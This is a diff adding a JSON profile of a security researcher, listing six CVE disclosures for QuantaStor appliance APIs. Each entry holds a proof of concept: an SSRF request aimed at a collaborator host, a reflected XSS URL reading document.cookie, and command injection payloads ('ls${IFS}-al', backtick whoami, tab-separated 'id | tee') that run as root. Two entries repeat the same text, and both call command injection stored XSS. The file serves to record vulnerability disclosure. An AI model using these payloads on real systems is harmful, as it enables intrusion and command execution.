@@ -1,0 +1,271 @@
+{
+  "name": "Célistine Oosting",
+  "last-updated": "2026-11-15T08:31:46Z",
+  "biography": "",
+  "contact": [],
+  "stats": {
+    "endorsements": 6,
+    "assessors": 1,
+    "with-evidence": 6,
+    "without-evidence": 0,
+    "by-domain": {
+      "cloud-security": 0,
+      "cyber-defense": 2,
+      "devsecops": 0,
+      "digital-forensics": 0,
+      "grc": 0,
+      "incident-response": 0,
+      "open-source-intelligence": 0,
+      "penetration-testing": 0,
+      "red-teaming": 0,
+      "reverse-engineering": 0,
+      "vulnerability-research": 6,
+      "identity-and-access-management": 0,
+      "iot-security": 0,
+      "operational-technology-security": 0,
+      "threat-hunting": 0,
+      "cybercrime-and-fraud": 0,
+      "unknown": 0
+    }
+  },
+  "endorsements": [
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-42079",
+      "description": "An authenticated administrator is able to prepare an alert that is able to execute an SSRF attack. This is exclusively with POST requests.\n\nPOC\n\nStep 1: Prepare the SSRF with a request like this:\n\nGET /qstorapi/alertConfigSet?senderEmailAddress=a&smtpServerIpAddress=BURPCOLLABHOST&smtpServerPort=25&smtpUsername=a&smtpPassword=1&smtpAuthType=1&customerSupportEmailAddress=1&poolFreeSpaceWarningThreshold=1&poolFreeSpaceAlertThreshold=1&poolFreeSpaceCriticalAlertThreshold=1&pagerDutyServiceKey=1&slackWebhookUrl=http://<target>&enableAlertTypes&enableAlertTypes=1&disableAlertTypes=1&pauseAlertTypes=1&mattermostWebhookUrl=http://<TARGET>\nHTTP/1.1\n\nHost: <HOSTNAME> \nAccept-Encoding: gzip, deflate\n\nAccept: */*\nAccept-Language: en\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\n\nConnection: close\n\nauthorization: Basic <BASIC_AUTH_HASH> \nContent-Type: application/json\n\nContent-Length: 0\n\nStep 2: Trigger this alert with this request\n\nGET /qstorapi/alertRaise?title=test&message=test&severity=1 \nHTTP/1.1\n\nHost: <HOSTNAME> \nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nAccept-Language: en\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\n\nConnection: close\n\nauthorization: Basic <BASIC_AUTH_HASH> \nContent-Type: application/json\n\nContent-Length: 1\n\nThe post request received by <TARGET> looks like this:\n{\n \n### Python FLASK stuff ####\n\n 'endpoint': 'index', \n \n'method': 'POST', \n \n'cookies': ImmutableMultiDict([]), \n \n### END Python FLASK stuff ####\n\n \n'data': b'{ \n  \"attachments\": [ \n   {\n\n    \"fallback\": \"[122] test / test.\",\n\n    \"color\": \"#aa2222\",\n\n    \"title\": \"[122] test\",\n\n    \"text\": \"test\",\n\n    \"fields\": [   \n     {    \n\n      \"title\": \"Alert Severity\",\n        \n      \"value\": \"CRITICAL\",\n        \n      \"short\": false  \n     },  {   \n      \"title\": \"Appliance\",     \n      \"value\": \"quantastor (https://<HOSTNAME>)\",\n      \n      \"short\": true  \n\n     },  {    \n\n      \"title\": \"System / Driver / Kernel Ver\",    \n\n      \"value\": \"5.10.0.156+a25eaacef / scst-3.5.0-pre / 5.3.0-62-generic\",    \n\n      \"short\": false  \n\n     },  {    \n\n      \"title\": \"System Startup\",    \n\n      \"value\": \"Fri Aug  6 16-02-55 2021\",    \n\n      \"short\": true  \n\n          },  {    \n\n      \"title\": \"SSID\",    \n\n      \"value\": \"f4823762-1dd1-1333-47a0-6238c474a7e7\",    \n\n      \"short\": true  \n\n     },\n    ],\n\n    \"footer\": \"QuantaStor Call-home Alert\",\n\n    \"footer_icon\": \" https://platform.slack-edge.com/img/default_application_icon.png \",\n\n    \"ts\": 1628461774\n   }\n  ], \n  \"mrkdwn\":true \n }', \n #### FLASK REQUEST STUFF #####\n\n 'headers': {\n\n  'Host': '<redacted>', \n  'User-Agent': 'curl/7.58.0', \n  'Accept': '*/*', \n  'Content-Type': 'application/json', \n  'Content-Length': '790'\n\n }, \n 'args': ImmutableMultiDict([]), \n 'form': ImmutableMultiDict([]), \n 'remote_addr': '217.103.63.173', \n 'path': '/payload/58', \n 'whois_ip': 'TNF-AS, NL'\n}\n\n#### END FLASK REQUEST STUFF #####",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: MEDIUM (CVSS 3.1, 6.2)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-42079",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-42079"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    },
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-42080",
+      "description": "An attacker is able to launch a Reflected XSS attack using a crafted URL.\n\nPOC:\n\nVisit the following URL\nhttps://<IPADDRESS>:8153/qstorapi/echo?inputMessage=<img%20src=x%20onerror=alert(document.cookie)>",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: HIGH (CVSS 3.1, 7.4)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-42080",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-42080"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    },
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-42081",
+      "description": "An authenticated administrator is allowed to remotely execute arbitrary shell commands via the API.\n\nPOC\nhttp://<IP_ADDRESS>/qstorapi/storageSystemModify?storageSystem=&newName=quantastor&newDescription=;ls${IFS}-al&newLocation=4&newEnclosureLayoutId=5&newDnsServerList=;ls${IFS}-al&externalHostName=&newNTPServerList=;ls${IFS}-al",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: CRITICAL (CVSS 3.1, 9.1)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-42081",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-42081"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    },
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-42082",
+      "description": "Local users are able to execute scripts under root privileges.\n\nPOC\n\nOn the local host run the following command:\n\ncurl 'localhost:8154/qstor/qs_upgrade.py?taskId=1&a=;`whoami`'",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: HIGH (CVSS 3.1, 7.8)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-42082",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-42082"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    },
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-42083",
+      "description": "An authenticated attacker is able to create alerts that trigger a stored XSS attack.\n\nPOC\n\n\n  *  go to the alert manager\n\n\n  *  open the ITSM tab\n  *  add a webhook with the URL/service token value \n\n'\t-h\t&&\tid\t|\ttee\t/tmp/ttttttddddssss\t#' (whitespaces are tab characters)\n\n\n  *  click add\n\n\n  *  click apply\n\n\n  *  create a test alert\n\n\n  *  The test alert will run the command \n\n“id\t|\ttee\t/tmp/ttttttddddssss” as root.\n\n\n  *  after the test alert inspect \n\n/tmp/ttttttddddssss it'll contain the ids of the root user.",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: HIGH (CVSS 3.1, 8.7)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-42083",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-42083"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "cyber-defense",
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "cyber-defense": [],
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    },
+    {
+      "name": "Célistine Oosting",
+      "label": "CVE-2021-4406",
+      "description": "An authenticated attacker is able to create alerts that trigger a stored XSS attack.\n\nPOC\n\n\n  *  go to the alert manager\n\n\n  *  open the ITSM tab\n  *  add a webhook with the URL/service token value \n\n'\t-h\t&&\tid\t|\ttee\t/tmp/ttttttddddssss\t#' (whitespaces are tab characters)\n\n\n  *  click add\n\n\n  *  click apply\n\n\n  *  create a test alert\n\n\n  *  The test alert will run the command \n\n“id\t|\ttee\t/tmp/ttttttddddssss” as root.\n\n\n  *  after the test alert inspect \n\n/tmp/ttttttddddssss it'll contain the ids of the root user.",
+      "type": "vulnerability_discovery",
+      "assessor": "MITRE CVE Program",
+      "assessor-id": "mitre",
+      "assessor-category": "vulnerability_database",
+      "assessor-rigor-level": "high",
+      "reviewType": "committee_review",
+      "subtitle": "CVE · Severity: CRITICAL (CVSS 3.1, 9.1)",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2021-4406",
+      "evidence-links": [
+        {
+          "title": "CVE record",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-4406"
+        }
+      ],
+      "evidence": true,
+      "povs": {
+        "milestones": {
+          "verifiable": true,
+          "defended": true,
+          "recognized": true,
+          "trusted": true
+        },
+        "level": 4,
+        "explanation": "A published CVE record provides public, independently verifiable recognition of the credited vulnerability disclosure."
+      },
+      "year": 2021,
+      "domains": [
+        "cyber-defense",
+        "vulnerability-research"
+      ],
+      "subspecialties": {
+        "cyber-defense": [],
+        "vulnerability-research": [
+          "cve-analysis-and-vulnerability-disclosure"
+        ]
+      }
+    }
+  ]
+}
